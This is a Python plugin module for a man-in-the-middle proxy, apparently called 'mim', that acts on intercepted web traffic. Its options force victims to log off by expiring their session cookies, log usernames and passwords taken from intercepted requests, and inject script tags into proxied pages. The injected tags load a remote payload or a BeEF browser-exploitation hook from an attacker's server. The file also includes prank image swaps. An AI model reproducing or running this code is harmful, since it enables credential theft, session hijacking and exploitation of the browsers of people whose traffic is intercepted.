
""" Contains multiple actions to handle callbacks from mim
    (More complex actions each have their own module and just need importing)

    Usage:
        from plugins import otherplugins
        otherplugins.init(args, BEEFPORT, FILESERVER, FILEPORT)

    The init function is needed to pass args and then test args["--option"]
"""

import logging as log

# used by actions
import os
import StringIO
from urlparse import urlparse
import lxml
# note this package is called Pillow
from PIL import Image

# callbacks
from mim.tools.pydispatch2 import on
from mim.proxyserver import gotRequest
from mim.proxyclient import gotResponseTree, gotResponseImage

def init(args, BEEFPORT, FILESERVER, FILEPORT):
    """ if option selected in args then connect callback function to signal """

########################### gotRequest ########################################################################

    if args["--kill"]:
        # domains that have had sessions killed to force logoff
        killed = set()

        @on(gotRequest)
        def kill(sender):
            """ kill session by expiring all cookies on first call to a domain """
            if sender.method == "POST" or not sender.requestHeaders.hasHeader('cookie') or \
                    sender.domain in killed:
                return
            log.debug("{id} Killing session for {domain}".format(id=sender.id, domain=sender.domain))
            sender.setResponseCode(302, "Moved")
            sender.setHeader("Connection", "close")
            sender.setHeader("Location", sender.pathquery)

            killed.add(sender.domain)

            # get list of unique cookie names
            names = set()
            cookies = sender.getHeader("cookie")
            for cookie in cookies.split(";"):
                names.add(cookie.split("=")[0].strip())

            # multiple attempts to kill session
            # domains = .reddit.com, forum.reddit.com; paths = /, /rootpath
            domains = [sender.domain, '']
            paths = ["/"]
            try:
                paths.append(sender.path.split("/")[1])
            except:
                pass

            for name in names:
                # note must include domain and must set path or set-cookie is ignored.
                # note must set expires date otherwise will be treated as a session cookie.
                for domain in domains:
                    for path in paths:
                        sender.addCookie(name, "expired", domain=domain, path=path, expires="Mon, 01-Jan-1990 00:00:00 GMT")

            log.debug("{id} Response to kill sessions:\n{response}" \
                                    .format(id=sender.id, response=sender.getResponse()))
            sender.finish()

    if args["--auth"]:
        @on(gotRequest)
        def auth(sender):
            """ log userids and passwords from get and post requests
                NOTE this will not work with most sites """

            include = ["log", "login", "logon", "user", "username", "key", "name", "email", \
                     "password", "pass", "passwd", "pwd", "psw", "passw", "auth"]

            query = sender.data if sender.data else sender.query
            if not query:
                return

            # split into auth and noauth
            q = urlparse.parse_qs(query)
            auth = dict()
            noauth = dict()
            for k, v in q.items():
                if k in include:
                    auth[k] = v
                else:
                    noauth[k] = v

            # output auth
            auth = '\n'.join(["%s=%s"%(k,v) for k, v in auth.items()])
            log.info("query strings===>\n%s"% auth)

            # output noauth truncating the values
            noauth = {k: v[:15]+"..." if len(v)>15 else v for k, v in noauth.items()}
            noauth = '\n'.join(["%s=%s"%(k,v) for k, v in noauth.items()])
            log.info("auth strings===> ***************************************\n%s" % noauth)

########################### gotResponseTree ########################################################################
    
    if args["--inject"]:
        @on(gotResponseTree)
        def inject(sender, tree):
            """ include jquery to remove https e.g. ebay changes loaded back to https after loading """
            injection = '<script src=http://%s:%s/injection.html></script>'%(FILESERVER, FILEPORT)
            head = tree.xpath("//head")[0]
            elem = lxml.etree.fromstring(injection)
            head.insert(0, elem)
    
    if args["--beef"]:
        @on(gotResponseTree)
        def beef(sender, tree):
            """ inject a beef hook for the browser exploitation framework """
            injection = '<script src=http://%s:%s/hook.js></script>'%(FILESERVER, BEEFPORT)
            head = tree.xpath("//head")[0]
            elem = lxml.etree.fromstring(injection)
            head.insert(0, elem)

    if args["--cats"]:
        @on(gotResponseTree)
        def cats(sender, tree):
            """ replace image links with link to image on server
            NOTE: does not replace other links e.g. <a> """
            for item in tree.xpath("//img"):
                item.attrib["src"] = "http://%s:%s/cats.jpg"%(FILESERVER, FILEPORT)

#################### gotResponseImage ###############################################################################

    if args["--upsidedown"]:
        @on(gotResponseImage)
        def upsidedown(sender):
            """ turn image upsidedown """
            try:
                s = StringIO.StringIO(sender.data)
                img = Image.open(s).rotate(180)
                s2 = StringIO.StringIO()
                img.save(s2, sender.imagetype)
                sender.data = s2.getvalue()
            except:
                log.exception("cannot rotate image with type=%s" % sender.imagetype)